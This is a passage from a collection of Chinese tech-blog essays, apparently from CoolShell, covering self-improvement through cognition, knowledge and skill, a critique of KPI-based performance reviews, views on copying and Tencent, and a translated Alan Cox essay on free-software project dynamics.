告诉他们，你现有的技能和知识不用更新，就能过好一辈子，新出来的东西没有生命力的……这样他们就会像我们再也不学习的父辈一样很快就会被时代所抛弃……   * 每个人都喜欢在一些自己做不到的事上找理由，这种能力不教就会，比如，事情太多没有时间，因为工作上没有用到，等等，你要做的就是帮他们为他们做不到的事找各种非常合理的理由，比如：没事的，一切都是最好的安排；你得不到的那个事没什么意思；你没有面好主要原因是那个面试官问的问题都是可以上网查得到的知识，而不没有问到你真正的能力上；这些东西学了不用很快会忘了，等有了环境再学也不迟……
**最后友情提示一下，上述的这些“最佳实践”你要小心，是所谓，贩毒的人从来不吸毒，开赌场的人从来不赌博！所以，你要小心别自己也掉进去了！这就是“欲练神功，必先自宫”的道理。**#### 相关原理和思维模型对于上面的这些技巧还有很多很多，你自己也可以发明或是找到很多。所以，我来讲讲这其中的一些原理。一般来说，超过别人一般来说就是两个维度：1. **在认知、知识和技能上** 。这是一个人赖以立足社会的能力（参看《程序员的荒谬之言还是至理名言？》和《21天教你学会C++》）   2. **在领导力上** 。所谓领导力就是你跑在别人前面，你得要有比别人更好的能力更高的标准（参看《技术人员发展之路》）首先，我们要明白，人的技能是从认识开始，然后通过学校、培训或是书本把“零碎的认知”转换成“系统的知识”，而有要把知识转换成技能，就需要训练和实践，这样才能完成从：认识 -> 知识 -> 技能 的转换。这个转换过程是需要耗费很多时间和精力的，而且其中还需要有强大的学习能力和动手能力，这条路径上有很多的“关卡”，每道关卡都会过滤掉一大部分人。比如：对于一些比较枯燥的硬核知识来说，90%的人基本上就倒下来，不是因为他们没有智商，而是他们没有耐心。
##### 认知要在认知上超过别人，就要在下面几个方面上做足功夫：1） **信息渠道** 。试想如果别人的信息源没有你的好，那么，这些看不见信息源的人，只能接触得到二手信息甚至三手信息，只能获得被别人解读过的信息，这些信息被三传两递后必定会有错误和失真，甚至会被传递信息的中间人hack其中的信息（也就是“中间人攻击”），而这些找不出信息源的人，只能“被人喂养”，于是，他们最终会被困在信息的底层，永世不得翻身。（比如：学习C语言，放着原作者K&R的不用，硬要用错误百出谭浩强的书，能有什么好呢？）2） **信息质量** 。信息质量主要表现在两个方面，一个是信息中的燥音，另一个是信息中的质量等级，我们都知道，在大数据处理中有一句名言，叫 garbage in garbage out，你天天看的都是垃圾，你的思想和认识也只有垃圾。所以，如果你的信息质量并不好的话，你的认知也不会好，而且你还要花大量的时间来进行有价值信息的挖掘和处理。3） **信息密度** 。优质的信息，密度一般都很大，因为这种信息会逼着你去干这么几件事，a）搜索并学习其关联的知识，b）沉思和反省，c）亲手去推理、验证和实践……一般来说，经验性的文章会比知识性的文章会更有这样的功效。比如，类似于像 Effiective C++/Java，设计模式，Unix编程艺术，算法导论等等这样的书就是属于这种密度很大的书，而像Netflix的官方blog和AWS CTO的blog等等地方也会经常有一些这样的文章。
##### 知识要在知识上超过别人，你就需要在下面几个方面上做足功夫：1） **知识树（图）** 。任何知识，只在点上学习不够的，需要在面上学习，这叫系统地学习，这需要我们去总结并归纳知识树或知识图，一个知识面会有多个知识板块组成，一个板块又有各种知识点，一个知识点会导出另外的知识点，各种知识点又会交叉和依赖起来，学习就是要系统地学习整个知识树（图）。而我们都知道， **对于一棵树来说，“根基”是非常重要的，所以，学好基础知识也是非常重要的，对于一个陌生的地方，有一份地图是非常重要的，没有地图的你只会乱窜，只会迷路、练路、走冤枉路！**2） **知识缘由** 。任何知识都是有缘由的，了解一个知识的来龙去脉和前世今生，会让你对这个知识有非常强的掌握，而不再只是靠记忆去学习。靠记忆去学习是一件非常糟糕的事。而对于一些操作性的知识（不需要了解由来的），我把其叫操作知识，就像一些函数库一样，这样的知识只要学会查文档就好了。 **能够知其然，知其所以然的人自然会比识知识到表皮的人段位要高很多。**3） **方法套路** 。学习不是为了找到答案，而是找到方法。就像数学一样，你学的是方法，是解题思路，是套路，会用方程式解题的和不会用方程式解题的在解题效率上不可比较，而在微积分面前，其它的解题方法都变成了渣渣。 **你可以看到，掌握高级方法的人比别人的优势有多大，学习的目的就是为了掌握更为高级的方法和解题思路** 。
##### 技能要在技能上超过别人，你就需要在下面几个方面做足功夫：1） **精益求精** 。如果你想拥有专业的技能，你要做不仅仅是拼命地重复一遍又一遍的训练，而是在每一次重复训练时你都要找到更好的方法，总结经验，让新的一遍能够更好，更漂亮，更有效率，否则，用相同的方法重复，那你只不过在搬砖罢了。2） **让自己犯错** 。犯错是有利于成长的，这是因为出错会让人反思，反思更好的方法，反思更完美的方案，总结教训，寻求更好更完美的过程，是技能升级的最好的方式。尤其是当你在出错后，被人鄙视，被人嘲笑后，你会有更大的动力提升自己，这样的动力才是进步的源动力。当然，千万不要同一个错误重复地犯！3） **找高手切磋** 。下过棋，打个球的人都知道，你要想提升自己的技艺，你必需找高手切磋，在和高手切磋的过程中你会感受到高手的技能和方法，有时候你会情不自禁地哇地一下，我靠，还可以这么玩！##### 领导力最后一个是领导力，要有领导力或是影响力这个事并不容易，这跟你的野心有多大，好胜心有多强 ，你愿意付出多少很有关系，因为一个人的领导力跟他的标准很有关系，因为有领导力的人的标准比绝大多数人都要高。1） **识别自己的特长和天赋** 。首先，每个人DNA都可能或多或少都会有一些比大多数人NB的东西（当然，也可能没有），如果你有了，那么在你过去的人生中就一定会表现出来了，就是那种大家遇到这个事会来请教你的寻求你帮助的现象。那种，别人要非常努力，而且毫不费劲的事。一旦你有了这样的特长或天赋，那你就要大力地扩大你的领先优势，千万不要进到那些会限制你优势的地方。你是一条鱼，你就一定要把别人拉到水里来玩，绝对不要去陆地上跟别人拼，不断地在自己的特长和天赋上扩大自己的领先优势，彻底一骑绝尘。
2） **识别自己的兴趣和事业** 。没有天赋也没有问题，还有兴趣点，都说兴趣是最好的老师，当年，Linus就是在学校里对minx着迷了，于是整出个Linux来，这就是兴趣驱动出的东西，一般来说，兴趣驱动的事总是会比那些被动驱动的更好。但是，这里我想说明一下什么叫“真∙兴趣”，真正的兴趣不是那种三天热度的东西，而是那种，你愿意为之付出一辈子的事，是那种无论有多大困难有多难受你都要死磕的事，这才是“真∙兴趣”，这也就是你的“野心”和“好胜心”所在，其实上升到了你的事业。相信我，绝大多数人只有职业而没有事业的。3） **建立高级的习惯和方法** 。没有天赋没有野心，也还是可以跟别人拼习惯拼方法的，只要你有一些比较好的习惯和方法，那么你一样可以超过大多数人。对此，在习惯上你要做到比较大多数人更自律，更有计划性，更有目标性，比如，每年学习一门新的语言或技术，并可以参与相关的顶级开源项目，每个月训练一个类算法，掌握一种算法，每周阅读一篇英文论文，并把阅读笔记整理出来……自律的是非常可怕的。除此之外，你还需要在方法上超过别人，你需要满世界的找各种高级的方法，其中包括，思考的方法，学习的方法、时间管理的方法、沟通的方法这类软实力的，还有，解决问题的方法（trouble shooting 和 problem solving），设计的方法，工程的方法，代码的方法等等硬实力的，一开始照猫画虎，时间长了就可能会自己发明或推导新的方法。
4） **勤奋努力执着坚持** 。如果上面三件事你都没有也没有能力，那还有最后一件事了，那就是勤奋努力了，就是所谓的“一万小时定律”了（参看《21天教你学会C++》中的十年学编程一节），我见过很多不聪明的人，悟性也不够（比如我就是一个），别人学一个东西，一个月就好了，而我需要1年甚至更长，但是很多东西都是死的，只要肯花时间就有一天你会搞懂的，耐不住我坚持十年二十年，聪明的人发明个飞机飞过去了，笨一点的人愚公移山也过得去，因为更多的人是懒人，我不用拼过聪明人，我只用拼过那些懒人就好了。好了，就这么多，如果哪天你变得消极和不自信，你要来读读我的这篇文章，子曰：温故而知新。（全文完）# 我看绩效考核作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn（本来，这篇文章应该在5月份完成，我拖延症让我今天才完成）前些天，有几个网友找我谈绩效考核的事，都是在绩效上被差评的朋友。在大致了解情况后，我发现他们感到沮丧和郁闷的原因，不全是自己没有做好事情，他们对于自己没有做好公司交给的事，一方面，持一些疑义，因为我很明显地感到他们和公司对一件是否做好的标准定义有误差，另一方面，他们对于自己的工作上的问题也承认。不过，让他们更多感到沮丧的原因则是，公司、经理或HR和他们的谈话，让他们感觉整个人都被完全否定了，甚至有一种被批斗的感觉。这个感觉实在是太糟糕了。
因为我也有相似的经历，所以，我想在这里写下一篇文章，谈谈自己的对一些绩效考核的感受。先放出我的两个观点：**1）制定目标和绩效，目的不是用来考核人的，而用来改善提高组织和人员业绩和效率的。****2）人是复杂的，人是有状态波动的，任何时候都不应该轻易否定人，绩效考核应该考核的是事情，而不是人。**我个人比较坚持的认为—— **绩效分应该打给项目，打给产品，打给部门，打给代码，而不是打给人。** 然而现在的管理体制基本上都是打给人，而很多根本不擅长管理的经理和HR以及很多不会独立思考的吃瓜群众基本上都会把矛头指向个人，所以，当然会有开批斗会的感觉。目录* 举几个例子   * 对公司和管理者想说的话   * 对职场人想说的话   * 其它#### 举几个例子为了讲清楚我的上述观点，请让我先铺垫一下，先说几个例子吧，韩寒的例子我就不说了。苏步青同学在小学时成绩很糟糕，全班倒数第一。华罗庚同学上学时数学还考不及格，要不是王维克老师的鼓励并让他爱上了数学，他可能也就完全埋没了。郑渊洁上学时，老师要求写《早起的鸟有虫子吃》，郑渊洁唱反调写《早起的虫子被鸟吃》，再加上数学老师发难，于是被开除了。从此郑渊洁没有上过一天学。
列夫尔斯泰大贵族出身，2岁丧母，9岁丧父，16岁上大学，大学三年级自动退学回家进行改革。在青年时期不好好读书，考试不及格，留级。他赌博、借债、鬼混……这个的例子太多了，我从另一个方面举几个体育运动相关的例子，可能年轻的朋友都不知道，可以问问你们的父母。80年代，中国有一批非常优秀的体育运动员，比如：体操王子李宁，打破过世界跳高记录的朱建华，还有乒乓球世界冠军马文革，还有羽毛球世界冠军赵建华，记得有一年参加世界比赛，他们全输了，而输的还很惨。于是国内的一些媒体和民众开始骂他们，甚至说他们是民族的败类、耻辱，还有很多人找上门要教训他们……如果我们把绩效分比做在学校里的考试分，那么你是否会和我一样认为，考试的成绩只能代表这个人对这些知识点的掌握或理解，而且仅仅在这个时间点，根本不代表这个人根本就不行，更不代表他一直不行。因为挂科太多被学校开除的同学，并不见得这些人在社会上就无活生活下去，反而，他们中的有些人可能会考试成绩好的人还活得好。不是么？这样的例子在我们身边还少吗？所以，当我看到某HR说某老员工——“他今天要不自己离开，未来一年也一定会因为绩效问题而被公司开了的”，除了感到居然有人类可以预知他人未来的可笑之外，我感到是一种悲哀，一种管理体制上的悲哀，我感到了在这HR考评背后一股非常强的暗流和不可见的力量让她干出了这样一件匪夷所思的事。
好些公司还考评价值观，价值观无可厚非， **我觉得一个企业的价值观是非常必要的，但是考核价值观是件非常危险的事情。** 这个世界上和传统势力唱反调的人实在是太多了，而被定性为价值观有问题被迫害的人也是多了去了。被批斗被侮辱被毒打的老舍；因为同性恋问题，被迫害而自杀的图灵；因为不同意教会观点被监禁8年都不愿意放弃自己的信仰最终被烧死的布鲁诺，…… 这样的事情已经够多了，新的时代里不应该再发生这样的事了，无论大小。考核价值观最大的问题就是非常容易的上纲上线，也非常容易的被制造政治斗争，也非常容易的扼杀各种不同思想，老实说，这从很大程度上是一种洗脑的手段——通过对人制造一种紧张或恐惧而达到控制思想的目的。#### 对公司和管理者想说的话下面我来谈谈绩效考核我的一些观点。在谈这个观点前，你可以移步看一下这篇新闻报道——《绩效主义毁了索尼》。而近年来，“放弃绩效考核”的斗争已经从科技企业中的Adobe、戴尔、微软、亚马逊，席卷到德勤、埃森哲、普华永道等咨询服务类企业。甚至通用电气（GE）——曾经的绩效管理的鼻祖，也宣布抛弃正式的年度绩效考核。在刚过去的2016年，腾讯的张小龙对微信事业群发出“警惕KPI”的呼声；李彦宏在内部信中将百度的掉队归咎于“从管理层到员工对短期KPI的追逐”；雷军干脆宣布小米“继续坚持‘去KPI’的战略，放下包袱，解掉绳索，开开心心地做事。”；王石也在个人微博中感慨：“绩效主义像企业的脓包”。
绩效考核在本质上就是像学校教育以分数论英雄，而忽略员工的成长和素质教育是一个道理。当学生和老师只关注考试分数时，而只有考试分数来评价老师和学生的优良中差时，老师和学生就会开始使用一些非常形式的方式来达到这个目标，比如：死记硬被，记套路，题海战术…… 而学习的能力的考评彻底地沦为了一种形式主义。反而，分数考的越高，脑子越死。（注：美国现行教育是不允许通过学生考试成绩来评价老师的能力的）近几年来，一些大公司开始使用 OKR – Objectives, Key Result ，但是在实践过程中，我发现好些公司用OKR，本质上还是KPI – Key Performance Indicator， 因为OKR里面有一个Key Result，用来衡量 Objectives 的结果指标。于是，使用者习惯性的设置上了KPI。 **我个人认为 OKR 有三个非常大的特性：0）由员工提出，1）以目标为导向。2）全员共享。**举个例子，OKR可能会是制定成下面这个样子的：Objectives：增强用户体验，Key Results：1）用户操作步骤减少20%以上，2）客服减少40%以上工单，3）用户99.9%的系统操作的响应时间为100ms以下
然后，把这个目标分解给产品、用户体验、技术团队，形成子的Objectives并关连上相应的父级的Key Result，比如，产品部门定义的Objectives：1）优化注册流程，减少2个步骤，2）优化红包算法，让用户更容易理解，3）提高商品质量，减少用户投诉。后端技术团队定义的Objectives： 1）定义SLA以及相关监控指标，2）自动化运维，减少故障恢复时间，3）提高性能，吞吐量在xxxqps下的99.9%的响应时间为xxms ……这个Objective会从公司最高层一直分解到一线员工，信息完全透明，每个人都可以看到所有人被分解到目标，每个人都知道自己在为什么样的目标而奋头，而每个人也可以质疑，改进，建议调整最高层的目标和方向。而不是领到的是被层层消化过的变味的二手，三手甚至四五手的信息。**而 KPI 最大的问题就是用 OKR 里的 Key Results 拿来当目标，从而导致员工只知道要做什么，不知道为什么，不知道为什么，不能理解目标，工作也就成了实实在在的应付！**松下公司早在1933年，就召集168名员工，把松下未来250年的远景规划目标公布于众，从1956年开始，就定期宣布并解读自身的“五年计划”，帮助每位员工的目光从眼前的短期利益移开，树立自己的理想和目标，也促进了松下的可持续性发展。
然而，今时不同往昔，随着产品周期的不断缩减、竞争对手的持续涌入、高新技术的频频迭代，企业的战略的变化与调整变得更加频繁，朝令夕改的经营策略已经成为兵家常态。 在这一过程中，有多少员工了解调整之后的战略呢？员工的绩效指标又根据战略调整多少次了呢？**KPI本身是一种被动的、后置的考察，在工作完成之后考察员工的行为是否符合标准。因此，员工对于公司的目标漠不关心，只关心自己的KPI，因为这才是自己的最大的利益，为了达到KPI，有的员工开始不思考，并使用一些简单粗暴的玩法，其实这样既害了公司，也害了自己。自己的成长和进步也因为强大的 KPI 而抛在了脑后。****当然，KPI 绩效考核一般来说，不一定会毁掉公司的，相反，对于喜欢使用蛮力的劳动密集型的公司来说，可能还有所帮助，然而，KPI毁掉的一定是团队的文化和团队的挑战精神，以及创新和对事业的热情，甚至会让其中的人失去应有的正常的判断力（分不清充分和必要条件，分不清很多事的因果关系）。**#### 对职场人想说的话那么，对于个人来说，如何面对公司给自己的绩效考核呢？如何面对他们的绩效考核呢？还是用学校考试分数来做对比，如果说，用考试分数论英雄，一个人考高分就是绩效上的人才，考不及格的人就是人渣，这对吗？当然不是。也许仅于对于考试来说可以把人分成三六九等，但是对于整个人生来说，考试成绩和一个人在这个社会里的的成就并没有非常直接的因果关系。面对现实的社会，最终很多成绩好的人为成绩差的人工作的例子也有很多很多了。
我想说什么？我想说的是—— **用一颗平常心来面对公司给你打的分数，因为那并不代表你的整个人生。但是，你要用一颗非常严肃的心来面对自己的个人发展和成长，因为这才是真正需要认真对待的事。**换句话说， **如果要给一个人打绩效分，那不是由一个公司在一个短期的时间时打出来，而是由这个人在一个长期的时间里所能达到的成就得出来的。**就像WhatsApp的联合创始人Brian Acton 在 2009年时面试Facebook时没有面试通过，然而在 5 年以后，他把自己创办的公司以190亿美元卖给了FaceBook。阿里巴巴的马云不也一样吗？找工作各种被拒，开办的第一个公司成绩也不好，20年前，一堆人都说马云这也不行那也不行，然而，后面呢？反过来说，也很多职业经理人在公司里绩效非常好，然后到了创业公司却搞得非常的糟糕，这又说明了什么呢？这就像动物一样，有的动物适合在水里生活，有的动物适合在陆地上，鱼在陆地上是无法生存的，你让老虎去完成游泳的工作，你让鱼去完成鸟类的工作，你能考核到什么呢？ **我们每个人都有适合自己的环境，找到适合自己的环境才是最关键的！与其去关注别人对自己的评价，不如去寻找适合自己的环境。**
所以， **一个特定环境下的绩效考核并不代表什么，而那些妄图用绩效考核去否定一个人的做法，或多或少就是“法西斯”或“红卫兵”的玩法** 。好了！让我们不要再说绩效考核了，让我们回到，真正让自己提高，让自己成长，让自己的强的话题上来吧。这里，我需要转引一篇文章《Do the Right Thing, Wait to get fired》，文中提到《 Team Geek》这本书中的一句话> **做正确的事情，等着被开除。** > > 谷歌新员工(我们称做“Nooglers”)经常会问我是如何让自己做事这么高效的。我半开玩笑的告诉他们这很简单： > **我选择做正确的事情，为谷歌，为世界，然后回到座位上，等着被开除。如果没有被开除，那我就是做了正确的事情——为所有人。如果被开除了，那选错了老板。总之，两方面，我都是赢** > 。这是我的职业发展策略。注明一下，“做正确的事，等着被开除”并不是一句鸡汤，而是让你变强大的话。因为强者自强，只有强者才能追求真理，而不是委曲求全。嗯， **考试分数不是关键，别人对你的评价也不是关键，自己有没有成长有没有提高有没有上一个台阶才是关键。KPI不是关键，OKR也不是关键，有没有在做正确的事，这才是关键！** 不是这样吗？
#### 其它我大学四年级时，觉得马上就要离开学校了，当时想干点以后再以没有机会干的事。想来想去，就是上学这么多年来，从来没有不及格过，于是我任性了一把，挂了一个科，去补考了一下。挂科的时候也收到一些同学的笑话，还有老师的批评，不过，这让我感觉我的学校经历更完整了。因为，这让我在22岁的时候，就经历并大概明白了一些人生的道理。从98年工作到2013年来，就像一个好学生一样，我从来没有出现过任何的工作绩效问题，反正还经常在工作中成为标杠型的人，然并卵，只有自己成长才是最真实的感觉。“做正确的事，等着被开除”，这可能是我迄今为止在职场里做的最疯狂也是最正确的事了。因为，这让我有更多的经历，让我从正确的事中得到提高，也让我内心变得越来越强大，也让我找到了更具挑战的事，更让我对自己有更清楚的认识。最后，我知道一定会有人来怼我，所以，最后我还想留段话，留给那些还是想通过绩效来否定人的人。如果你对我的绩效或技术能力有怀疑，没问题，那么希望你能做到下述我已做到的事，再来喷我，谢谢！“ **在你40岁，在父亲病重，孩子上学问题、房贷并未还清、你是全家唯一收入来源之类的中年危机的情况下，辞去你现在的工作，不加入任何一家公司，不用自己的任何一分钱积蓄，不要任何人的投资和帮助。只通过自己的技术能力，为别人解决相应的技术难题（不做任何无技术含量的外包项目），来生存养家，并除了能照顾好自己的家人没有降低自己的生活水平之外，还能再养活3个每人年薪36万元的工程师** ”
请问这样的绩效能打个几分呢？呵呵。当然，不管怎么说，我还有很多路要走，还有很多不足，我还要继续努力。所以，我挑了一条对我来说最难走的路，作死创业……（全文完）# 抄袭，腾讯 和 产品作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn很早就想写这篇文章了，只是想法比较零碎，所以一直没有成文，这两天觉得思考得比较成熟了一些，所以把我的这些想法整理下来，欢迎大家一起和我讨论。目录* 鄙视抄袭和山寨   * 理性对待抄袭   * 如何不被腾讯抄袭   * 什么是真正的产品#### 鄙视抄袭和山寨首先，先表达我的立场，我对抄袭的立场持BS和痛恨的态度，尤其是那些C2C的网站，痛恨这些国外有什么就山寨什么的做法，尤其是那些连界面都不改，像素级的抄袭，连CSS和img都是一样的，更甚者，连图片都链接到抄袭源的网站去了，连源代码都抄的行为，比如：腾讯抄新浪的代码，新浪抄twitter的源码。无法不BS之。有很多网友邀请我去那个抄袭Quora的网站上去回答问题，借此，再次声明我不会去的。因此，有一些网友说，我不一样也在Twitter的抄袭网站新浪微博上吗？说我装逼了。我想说，新浪和Twitter基本上是同一种产品的思路，但是其实现不一样，新浪微博上一些twitter上没有功能，我个人觉得这并不算抄袭，我甚至认为新浪微博和Twitter各有长处，在一些功能上新浪微博比twitter做得更好。你可以理解为，新浪微博总体上来说并没有突破我心中的那个条抄袭的底线。
我个人对抄袭的理解如下：1）你可以复制别人的想法和功能，但是如果你连界面设计，代码，图片，风格，布局，等等所有的一切都照抄，那我就一定要鄙视你。2）你可以仿照别人的产品，但是你的出发点应该是他没做好，我来把它把做好，如果你的出发点是为了复制抄袭和山寨，我一样鄙视。所以，你可以理解我为什么不去Quora，Stackoverflow，Facebook，Google的山寨网站了，因为上述两点，1）完全复制，2）山寨地太次。#### 理性对待抄袭因为很多朋友极端地理解了我对抄袭的立场，所以我有必要要说说我对“抄袭”或是“模仿”的其它一些观点：**1）“抄袭想法”** 。想法这个东西我不觉是有什么专有的东西，也不存在什么抄袭，好的想法，就不应该被垄断，好的想法是应该放出来让大家一起来实现的。所以，我并不觉得一个想法有什么不能被抄袭的。你做Web Server，我也做Web Server，你做论坛，我也做论坛，你做手机，我也做手机，你做便携电脑，我也做便携电脑，你做通讯软件，我也可以做通讯软件…… 等等，越是优秀的产品和思路，就越不可能不被别人学习和模仿的。**2）“抄袭界面”** 。根据法律来说，界面上的某些元件，如菜单，按钮，甚至布局，配色之类的单一的东西是没有版权的，但是这些东西组成的界面是存在版权的，你不能让你的产品界面和别人的界面长得雷同。而且，对于一些有艺术特征的设计和版式是受法律保护的。所以，对于界面来说，我们需要做一些区别，比如，很多电视机长得很相似，连摇控器都很相似，但是电视其中的菜单和功能会有不同；很多的家用小汽车形状都很相似，但是线条和外形并不相似；Unix和Linux的用户接口几乎一样，但是Unix和Linux的内部实现和功能上有很大的不同（比如文件系统，内核管理等），MacOS/Windows/X-Win/Gnome/KDE 这些桌面系统大同，但是实现和细节上又不一样。
看我这样一说，你会说，嗯，你说的就是所谓的“微创新”！是的，这是个仁者见仁，智者见智的问题了。再说一遍，无所谓什么微创新不微创新，我对此的价值观很简单 —— **只要你这个复制品在不违反法律的层面上，能在品质上超过原来那个产品，我是会认可的，而且还是会对复制品买帐的** 。总之，我想说的是——1）好的东西总是会让人去学习和仿制的，而学习和仿制好的一面是会引入竞争，竞争会让这个东西更好的。2）不要害怕被人仿制，被人仿制说明你做得好，如果你的仿冒者超过了你，那你应该反思自己，而不要赖别人。#### 如何不被腾讯抄袭说起抄袭这个事来，就不得不说腾讯，现在互联网上一堆人都在思考，腾讯太变态，无论我做什么，都逃不出他的魔掌。很多风投都在问创业团队一个问题——“如果腾讯抄你，你怎么办？”。在我往下阐述如何不被腾讯抄的话题下，请让我先重申一下我在“腾讯，竞争力 和 用户体验”一文中说的那个观点：“ _腾讯这样大规模的抄袭和山寨，对整个社会的价值就是——会让很多很多的创业团队放弃Copy，甚至让他们要放弃那些容易被复制的“业务型的项目”，而逼着他们去努力思考，如何才不能被腾讯复制，如何才能有自己的核心价值_ ”，我把这个观点再进一步阐述，“ **有腾讯在，会让你更清楚地认识什么叫创业的残酷，会让你更清楚认识到什么是真正产品的价值，什么是核心竞争力，你但凡有一点急功近利的想法你都要想一想那个有钱有人有势也很急功近利的企鹅！** ”
我不知道，我写了那篇文章这段时间来，大家有没有思考过前边文章里我说的问题？其实我在“腾讯，竞争力 和 用户体验”一文中已经说到过一些了，不知道大家有没有去思考？老实说，其实腾讯并不可怕，先让我们来分析一下腾讯的特征和短板：* **特征** 。腾讯的很多产品线完全雷同，比如：QQ，微信，空间，群，微博，朋友，等等，几乎完全一样，所以，这是不是说明了下面几个问题：1）他们人太多，没事干了，所以什么都干。   2）各产品线为了规避风险都想伴QQ这个大款，所以不知道怎么创新。   3）内部竞争激烈，技术团队加班赶工，所以只能无目的地广撒网了。* **短板** 。你看看腾讯的这些产品线和他的用户群，我觉得就目前阶段，腾讯至少有三种产品复制不出来。1）有烦杂的线下业务的产品。比如：电子商务需要供应商，仓库，物流，等这样物理流程的业务很难复制。   2）有质量，有价值，有权威的社区。比如，豆瓣，Stackoverflow，Quora这样的有价值的社区。   3）有技术含量的产品，比如： Nginx，MySQL，Android/iOS 之流技术大于业务的产品。通过这样的分析，我想告诉大家， **腾讯并不可怕，可怕的是你自己不会思考和观察，可怕的是你急功近利而没有去找有价值的东西来做** 。推而广之，如果你想做的东西是很快就能做出来的，那么你就不要指望不被人抄，也就是说， **如果你着眼短期，你无疑会面对众多的抄袭和模仿者让你万劫不复，但是，如果你着眼长期，做一个3-5年需要花费大量精力才会成熟的产品，那么，那些急功近利的抄袭者会知难而退的** 。因为，“需要3-5年的时间”这一条完全不符合抄袭者的价值观，所以，你面对的竞争对手也会少了9成。
#### 什么是真正的产品说到这里，我必需要说一下什么是真正的产品！我看到现在很多创业团队把功能当产品来做，这就为模仿者们留下了很多很多机会，比如苹果商店里的很多照片分享的Apps，或是一些云存读，云分享之类的东西，如：Dropbox和Evernote，或是一些旅游类的Apps。这些东西在我眼里还不能算得上是真正的产品，所以，我们可以看到他们的模仿者有很多很多。当然，我并不是说不能把功能当成产品来做，只是我觉得这样的产品并不长久，并不具强大的可持续性，而且很容易被取代。那怕是现在风头正劲的Instgram, Dropbox, Evernote，大家试想一下，如果哪天Apple或是Canon把Instgram这样的功能集成到他的照相功能中，哪天操作系统把Dropbox/Evernote集成到他的操作系统中。（当然，我只是说有这种可能，我只是想让大家思考一下以功能为产品的弱势是什么样的）好，让我来说说什么是真正的产品：* **真正的产品应该是有一个端到端的一个解决方案** 。比如说：电子阅读中的从购书，到阅读，再到阅读心得分享，再到推荐，这一整套的解决方案。看看苹果的产品的端到端的解决方案，就知道什么是产品的样子了。
* **真正的产品应该是有价值的** 。这种价值表现在——你可以从中获得有价值的内容，并且你也可以通过他创造对你有价值的东西。比如，像豆瓣，像Stackoverflow，甚至像Twitter和微博这样让信息平等让信息传递更快的社区，或是像AWS或是Apple的开发平台，等等。可见，我们无法通过QQ获得有价值的东西，我们也无法通过QQ创造有价值的东西。* ****真正的产品应该是和社会有交互并能自我进化的** 。**真正的产品应该是用户会来贡献有价值的内容，真正的产品应该是有开放的接口让其它系统容易集成的。也就是说，真正的产品应该是有一个生态圈的，在这个生态圈内，不但能自给自足，自我循环，还能自我管理，自我进化。可见，腾讯的用户群完全没有为这个平台贡献什么有价值的东西，更不谈他们会帮腾讯来进化了。* **真正的产品应该是体现品质的** 。所谓有品质的意思是，你能从使用这个产品中获得一种感觉，一种档次的提升的感觉。你可以认为使用品牌而非山寨的智能手机，使用一些如Thinkpad或MacBook的笔记本电脑或iPad，因为那是一种品质的体现。但是我们都知道，使用QQ完全没有任何品质的感觉，你不会在你的简历中放上QQ号，你也不会在一些商务场合使用QQ的，不是吗？这就好像请客吃饭一样，你总是会请你的朋友去一些有品质的饭馆而不是拉面馆。
当你把你的产品目标放在这样高的位置上，你不难发现，一来，仿冒者们无法跟上你的跟步，二来，仿冒者们几乎没有办法来复制。因为，他们只能复制到外表，但永远无法复制到产品的精髓。还是那句话， **因为仿冒者们急功近利的基因就决定了他们做不到抄袭。因为QQ用户群的基因也决定了腾讯无法复制豆瓣或Stackoverflow** 。（全文完）# Alan Cox：大教堂、市集与市议会作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**在网上搜到的Cox大叔于1998年在开源社区写的一篇文章，当时很轰动，明眼人一看就知道是针对ESR那篇《大教堂与市集》，从中可见Alan在项目管理风格上乃至个人性格上都与ESR、Linus等人不同之处。顺便说一句，Alan现在出于“家庭原因”已经离开了Linux项目，他曾经评价Linus是a good developer but a terrible engineer，甚至在Google+上直接说Linus就是一a*sh**e。不管如何，两位曾经十余年里并肩战斗惺惺相惜的大牛就此分道扬镳还是惹人唏嘘。
言归正传，以下为slashdot收录的英文原文：Cathedrals, Bazaars and the Town Council。以下是一些我对市集模式的想法，我认为这值得分享，这种模式会教你如何完全毁掉一个自由软件项目。我还举了一个我称之为“市议会”(Town Council)效应的实例（虽然那些市议员们可不这么认为，注：此处指Linux项目开发者）。关于软件开发人员，你必须去了解一些情况。首先要了解的是真正优秀的程序员相对来说并不普遍，不仅如此，在很多其它专业领域里“真正的程序员”和一些捣乱的家伙之间的区别要比“伟大”和“普通”之间的区别要大得多，研究表明生产效率上最好的同其余的比重是30:1。其次，你需要了解的是一大堆妄想型码农(wannabe programmer)总是善于发表意见。其中很多人患上了一种叫做“流行性热词”(buzzword)疾病，或者对他们“非黑即白”(one true path)的思考方式有着特殊的偏执，网上很多讨论都是廉价的。第三个关于软件项目的事情就是我们所谓的“闲杂人员”(the masses)。他们不是编程人员，而在其它方面有着大量贡献——文档编辑、用户支持，以及对那类经常争论你应该获得许可证才能上网的人的说服工作。
我想以Linux 8086（注，Intel设计的16位处理器架构）为例来说明如何将整个工程全部搞砸。将Linux的一个子集移植到8086上大体是这世上最无聊的活动之一。整件事的发起就像个笑话并走向失控。只有极少数真正的程序员会将时间及其良好的精神状态（或许那是假的）花费在那些唯一价值在于“黑客精神”(Hack Value)的项目上，故而在任何时候那种项目也就两三个核心贡献人员而已。不幸的是大批人认为将Linux运行在8086上是干净的，为此义不容辞地想要“入伙”。这类人大多属于妄想型码农之流，以至于连闲杂人员在一个安全距离之外都会沾染上这个项目的“愚蠢”因子。问题的导火索在于一大批充满（大多善意的）危险的一知半解的人们的意识观念——不是代码，而是意识观念。他们似乎很懂得如何去编程，但很多人连“Hello World”这样的C程序都不会。他们花了几星期时间去争论并投票该使用什么编译器，甚至在项目开展一年后还在争论是否去写个充分完美的编译器。他们热衷于辩论如何生成大量二进制文件，却又对内核swapper（注，即idle task）设计一无所知。Linux 8086项目仍然进行着，真正的开发人员将邮件列表里许多其他成员加入到清除文件(kill files)中，以便他们之间可以顺畅地通过邮件列表沟通，只因半吊子打酱油的家伙实在太多了。这一切不再是市集模式，而是形成了一个核心小组，对圈子里许多人而言这是一种礼貌用语。在这种情形下人们不可避免地处于被动位置。
